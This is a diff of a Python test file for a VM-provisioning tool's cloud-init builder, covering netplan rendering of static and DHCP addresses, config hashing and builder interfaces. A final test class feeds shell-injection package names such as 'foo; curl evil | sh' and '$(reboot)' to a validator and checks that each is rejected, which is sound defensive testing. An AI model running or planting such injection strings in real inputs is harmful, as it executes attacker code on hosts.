-        netplan = yaml.safe_load(wf["/etc/netplan/50-cloud-init.yaml"]["content"])
-        eth = netplan["network"]["ethernets"]["id0"]
-        assert eth["addresses"] == ["172.31.0.50/24"]
-        assert eth["nameservers"] == {"addresses": ["172.31.0.1"]}
-        assert eth["routes"] == [{"to": "default", "via": "172.31.0.1"}]
-        assert "dhcp4" not in eth
-
-    def test_staged_netplan_first_static_gets_default_route(self) -> None:
-        # Two static NICs: only the first declares the default route.
-        spec = _static_spec(
-            LibvirtNetworkIface("netA", addr=StaticAddr("172.31.0.50")),
-            LibvirtNetworkIface("netB", addr=StaticAddr("10.10.10.50")),
-        )
-        b = CloudInitBuilder(base=CacheEntry("x"))
-        body = yaml.safe_load(b.render_user_data(spec, _recipe(b, spec), addressing=DEFAULT_ADDR))
-        wf = {entry["path"]: entry for entry in body["write_files"]}
-        netplan = yaml.safe_load(wf["/etc/netplan/50-cloud-init.yaml"]["content"])
-        eths = netplan["network"]["ethernets"]
-        assert "routes" in eths["id0"]
-        assert "routes" not in eths["id1"]
-
-    def test_staged_netplan_mixed_static_dhcp(self) -> None:
-        # NIC0 static, NIC1 DHCP — netplan reflects both branches.
-        spec = _static_spec(
-            LibvirtNetworkIface("netA", addr=StaticAddr("172.31.0.50")),
-            LibvirtNetworkIface("netB", addr=DHCPAddr()),
-        )
-        b = CloudInitBuilder(base=CacheEntry("x"))
-        body = yaml.safe_load(b.render_user_data(spec, _recipe(b, spec), addressing=DEFAULT_ADDR))
-        wf = {entry["path"]: entry for entry in body["write_files"]}
-        netplan = yaml.safe_load(wf["/etc/netplan/50-cloud-init.yaml"]["content"])
-        eths = netplan["network"]["ethernets"]
-        assert eths["id0"]["addresses"] == ["172.31.0.50/24"]
-        assert eths["id1"]["dhcp4"] is True
-
-    def test_install_network_config_stays_dhcp(self) -> None:
-        # The install-time network-config must remain DHCP-only even when a
-        # NIC has a static ipv4 — install runs on a different subnet.
-        spec = _static_spec(LibvirtNetworkIface("netA", addr=StaticAddr("172.31.0.50")))
-        b = CloudInitBuilder(base=CacheEntry("x"))
-        netcfg = yaml.safe_load(
-            b.render_network_config(spec, _recipe(b, spec), addressing=DEFAULT_ADDR)
-        )
-        eth = netcfg["ethernets"]["id0"]
-        assert eth["dhcp4"] is True
-        assert "addresses" not in eth
-
-    def test_config_hash_sensitive_to_ipv4(self) -> None:
-        b = CloudInitBuilder(base=CacheEntry("x"))
-        spec_a = _static_spec(LibvirtNetworkIface("netA", addr=StaticAddr("172.31.0.50")))
-        spec_b = _static_spec(LibvirtNetworkIface("netA", addr=StaticAddr("172.31.0.60")))
-        h_a = b.config_hash(spec_a, _recipe(b, spec_a), addressing=DEFAULT_ADDR, base_sha="z")
-        h_b = b.config_hash(spec_b, _recipe(b, spec_b), addressing=DEFAULT_ADDR, base_sha="z")
-        assert h_a != h_b
-
-    def test_config_hash_static_vs_dhcp_differs(self) -> None:
-        b = CloudInitBuilder(base=CacheEntry("x"))
-        spec_dhcp = _static_spec(LibvirtNetworkIface("netA", addr=DHCPAddr()))
-        spec_static = _static_spec(LibvirtNetworkIface("netA", addr=StaticAddr("172.31.0.50")))
-        h_dhcp = b.config_hash(
-            spec_dhcp, _recipe(b, spec_dhcp), addressing=DEFAULT_ADDR, base_sha="z"
-        )
-        h_static = b.config_hash(
-            spec_static, _recipe(b, spec_static), addressing=DEFAULT_ADDR, base_sha="z"
-        )
-        assert h_dhcp != h_static
-
-
-class TestRunPhaseNetplanTriState:
-    """``addr`` is a three-case sum type: ``None`` (no address),
-    ``DHCPAddr()``, or ``StaticAddr(...)`` (unspecified gw/dns/prefix derive
-    from the Switch). Replaces the old overload where a NIC with no ``ipv4``
-    meant DHCP. See TODO.md "Run-phase netplan renders ``dhcp4: true`` for a
-    no-DHCP NIC".
-    """
-
-    def _netplan(
-        self,
-        nic: LibvirtNetworkIface,
-        addressing: Mapping[str, NetworkAddressing] = DEFAULT_ADDR,
-    ) -> dict[str, Any]:
-        # Render directly — bypasses the single-NIC-all-DHCP write_files skip so
-        # each address mode's netplan can be inspected in isolation.
-        from testrange.builders.cloudinit import _render_run_netplan_yaml
-
-        body = yaml.safe_load(_render_run_netplan_yaml(_static_spec(nic), addressing))
-        eth: dict[str, Any] = body["network"]["ethernets"]["id0"]
-        return eth
-
-    def test_staged_netplan_nic_on_bare_switch(self) -> None:
-        # addr=None: the NIC exists but takes no address. Must NOT emit
-        # dhcp4: true (the bug) — leave it to the OS so boot doesn't block
-        # waiting for a lease nothing serves.
-        eth = self._netplan(LibvirtNetworkIface("netA", addr=None))
-        assert eth["dhcp4"] is False
-        assert eth["dhcp6"] is False
-        assert eth["optional"] is True
-        assert "addresses" not in eth
-
-    def test_staged_netplan_explicit_dhcp(self) -> None:
-        eth = self._netplan(LibvirtNetworkIface("netA", addr=DHCPAddr()))
-        assert eth["dhcp4"] is True
-        assert eth["dhcp6"] is False
-        assert "addresses" not in eth
-
-    def test_staged_netplan_static_derives_from_switch(self) -> None:
-        # StaticAddr with no prefix/gw/dns on a managed (nat+dns) switch:
-        # prefix/gateway/dns all derived from the Switch's NetworkAddressing.
-
-        eth = self._netplan(LibvirtNetworkIface("netA", addr=StaticAddr("172.31.0.50")))
-        assert eth["addresses"] == ["172.31.0.50/24"]
-        assert eth["nameservers"] == {"addresses": ["172.31.0.1"]}
-        assert eth["routes"] == [{"to": "default", "via": "172.31.0.1"}]
-
-    def test_staged_netplan_static_dictates_gateway_on_dumb_switch(self) -> None:
-        # Dumb L2 switch (no nat/dns => derived gateway/dns are None). A guest
-        # at .123 acts as the gateway; the NIC dictates everything via StaticAddr.
-
-        bare = {
-            "netA": NetworkAddressing(
-                cidr="192.168.5.0/24", prefix_len=24, dhcp=False, gateway=None, dns_server=None
-            )
-        }
-        eth = self._netplan(
-            LibvirtNetworkIface(
-                "netA",
-                addr=StaticAddr("192.168.5.124/24", gw="192.168.5.123", dns=("192.168.5.123",)),
-            ),
-            addressing=bare,
-        )
-        assert eth["addresses"] == ["192.168.5.124/24"]
-        assert eth["routes"] == [{"to": "default", "via": "192.168.5.123"}]
-        assert eth["nameservers"] == {"addresses": ["192.168.5.123"]}
+        # The build NIC's MAC is baked into the netplan delivered as network-config.
+        assert b"02:00:00:aa:bb:cc" in files["/network-config"]
 
 
 class TestWaitReady:
@@ -551,6 +663,12 @@ class TestWaitReady:
         with pytest.raises(BuildNotReadyError, match="exited 1"):
             b.wait_ready(spec, _recipe(b, spec), ex)
 
+    def test_os_disk_base_returns_base_image(self) -> None:
+        # ORCH-5: the orchestrator reads OS-disk origin through this ABC seam.
+        base = CacheEntry("debian-13")
+        b = CloudInitBuilder(base=base, credentials=[PosixCred("u", password="p")])
+        assert b.os_disk_base() is base
+
     def test_abc_default_is_noop(self) -> None:
         from testrange.builders.base import Builder
         from testrange.credentials.base import Credential
@@ -560,10 +678,15 @@ class TestWaitReady:
             def credentials(self) -> tuple[Credential, ...]:
                 return ()
 
-            def config_hash(self, spec, recipe, *, addressing, base_sha="", macs=()):  # type: ignore[no-untyped-def]
+            def os_disk_base(self):  # type: ignore[no-untyped-def]
+                return None
+
+            def config_hash(  # type: ignore[no-untyped-def]
+                self, spec, recipe, *, addressing, base_sha="", sidecar_sha="", macs=(), build_nic
+            ):
                 return "0" * 16
 
-            def render_seed(self, spec, recipe, *, addressing, macs=()):  # type: ignore[no-untyped-def]
+            def render_seed(self, spec, recipe, *, addressing, macs=(), build_nic):  # type: ignore[no-untyped-def]
                 return b""
 
         b = _NullBuilder()
@@ -571,3 +694,20 @@ class TestWaitReady:
         ex = _FakeExec()
         b.wait_ready(spec, _recipe(_basic_builder(), spec), ex)
         assert ex.calls == []  # the ABC default never touches execute
+
+
+class TestPackageNameValidation:
+    def test_real_names_accepted(self) -> None:
+        # The package names actually used across examples must pass.
+        for name in ("nginx", "qemu-guest-agent", "python3-pip", "g++", "lib.foo_bar"):
+            assert Apt(name).name == name
+            assert Pip(name).name == name
+
+    def test_shell_metacharacters_rejected(self) -> None:
+        # H9: a name flows unquoted into apt-get/pip install, so an injection
+        # payload must be rejected at the trust boundary, not reach the shell.
+        for bad in ("foo; curl evil | sh", "$(reboot)", "a b", "x`id`", "foo&&bar"):
+            with pytest.raises(ValueError, match="valid package name"):
+                Apt(bad)
+            with pytest.raises(ValueError, match="valid package name"):
+                Pip(bad)
